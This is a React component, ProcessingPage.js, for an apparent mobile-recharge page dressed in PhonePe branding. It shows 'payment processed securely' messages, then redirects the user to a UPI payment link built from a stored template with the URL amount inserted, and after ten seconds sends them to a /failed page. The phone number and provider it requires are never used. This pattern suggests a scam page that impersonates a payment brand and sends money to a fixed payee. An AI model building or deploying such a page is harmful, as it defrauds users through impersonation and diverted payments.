// src/ProcessingPage.js
import React, { useEffect, useState } from 'react';

const messages = [
  '<p class="text-lg font-semibold text-purple-900 popup-title">Processing...</p>',
  '<p class="text-gray-600">Please wait while we prepare your recharge</p>',
  '<p class="text-gray-600 font-medium">Please do not close this page</p>',
  '<p class="text-green-600">Your payment is being processed securely</p>',
];

const messages2 = [
  '<p class="text-lg font-semibold text-purple-900 popup-title">Processing your payment</p>',
  '<p class="text-gray-600">Please complete the payment in your UPI app</p>',
  '<p class="text-gray-600 font-medium">Please do not close this page</p>',
  '<p class="text-green-600">Your payment is being processed securely</p>',
];

const messages3 = [
  '<p class="text-lg font-semibold text-purple-900 popup-title">Payment in progress</p>',
  '<p class="text-gray-600">Please wait while we process your payment</p>',
  '<p class="text-gray-600 font-medium">Please do not close this page</p>',
  '<p class="text-green-600">Your payment is being processed securely</p>',
];

// Each set also has a custom duration (ms)
const allMessages = [
  { content: messages, duration: 1000 },
  { content: messages2, duration: 1000 },
  { content: messages3, duration: 1000 },
];

function ProcessingPage() {
  const [currentMessageSet, setCurrentMessageSet] = useState(0);

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const amount = urlParams.get('amount');
    const number = urlParams.get('number');
    const provider = urlParams.get('provider');

    if (!amount || !number || !provider) {
      console.error('Missing required URL parameters.');
      return;
    }

    let timeouts = [];

    const showSet = (index) => {
      if (index < allMessages.length - 1) {
        setCurrentMessageSet(index);
        const t = setTimeout(() => showSet(index + 1), allMessages[index].duration);
        timeouts.push(t);
      } else {
        setCurrentMessageSet(index);
        (async () => {
          try {
            const response = await fetch('/upi.txt');
            const upiTemplate = await response.text();
            const newUpiUrl = upiTemplate.replace(/&am=[\d\.]+/i, `&am=${amount}`);
            window.location.replace(newUpiUrl);

            const finalRedirect = setTimeout(() => {
              window.location.replace('/failed');
            }, 10000);
            timeouts.push(finalRedirect);
          } catch (error) {
            console.error('Failed to fetch or process UPI template:', error);
          }
        })();
      }
    };

    showSet(0);

    return () => {
      timeouts.forEach(clearTimeout);
    };
  }, []);

  const currentMessages = allMessages[currentMessageSet].content;

  const style = { 
    padding: '20px', 
    textAlign: 'center', 
    fontFamily: 'Inter, sans-serif',
    color: '#333',
    backgroundColor: '#f8f8f8',
    minHeight: '100vh',
    display: 'flex',
    flexDirection: 'column',
    justifyContent: 'center',
    alignItems: 'center',
    borderRadius: '8px',
  };

  const messageElements = currentMessages.map((msg, index) =>
    React.createElement('div', { key: index, dangerouslySetInnerHTML: { __html: msg } })
  );

  return (
    <div>
<div
        class="py-4 px-6 bg-white flex items-center justify-between border-b border-slate-100 mb-0"
      >
        <div class="flex items-center">
          <svg
            stroke="currentColor"
            fill="currentColor"
            stroke-width="0"
            viewBox="0 0 448 512"
            class="text-[#5F259F] mr-3"
            height="19"
            width="19"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"
            ></path></svg
          ><a href="/"
            ><img
              src="/images/phonepe.png"
              alt=""
              class="h-8"
          /></a>
        </div>



        

        
        <div>
          <svg
            stroke="currentColor"
            fill="currentColor"
            stroke-width="0"
            viewBox="0 0 512 512"
            class="text-[#5F259F]"
            height="25"
            width="25"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M399 384.2C376.9 345.8 335.4 320 288 320H224c-47.4 0-88.9 25.8-111 64.2c35.2 39.2 86.2 63.8 143 63.8s107.8-24.7 143-63.8zM0 256a256 256 0 1 1 512 0A256 256 0 1 1 0 256zm256 16a72 72 0 1 0 0-144 72 72 0 1 0 0 144z"
            ></path>
          </svg>
        </div>
      </div>

      <div class="loader mx-auto mb-4"></div>

        <div class="textAlign-center">
            {/* Cycling messages */}
            {messageElements}
        </div>
    </div>
  );
}

export default ProcessingPage;
